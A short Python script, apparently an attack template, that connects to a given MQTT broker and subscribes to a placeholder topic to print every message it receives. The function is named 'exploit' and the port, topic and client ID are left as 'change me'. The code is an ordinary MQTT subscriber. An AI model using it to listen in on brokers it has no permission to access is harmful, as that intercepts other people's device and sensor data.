import paho.mqtt.client as mqtt
import sys

def on_connect(client, userdata, flags, rc): # The callback for when 
    print("Connected to MQTT broker.")
    client.subscribe("change me") # put topic to subscribe
    print("Subscribed to topic.")
    print("Waiting for messages...")

def on_message(client, userdata, msg): # The callback for when a PUBLISH 
    print("=================================")
    print("topic is :" + msg.topic) # Print a received topic
    print("Message is: " + str(msg.payload)) # Print a received msg

def exploit(host):
    port = 0 #change me
    client = mqtt.Client(client_id="change me") # put client ID 

    client.on_connect = on_connect # Define callback function for successful connection
    client.on_message = on_message # Define callback function for receipt of a message

    print("Connecting to MQTT broker on %s" % host)
    client.connect(host,port ,60 ) # host, port, connect time out
    client.loop_forever()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('USAGE: %s <host>' % sys.argv[0])
        exit(-1)

    sys.exit(exploit(sys.argv[1]))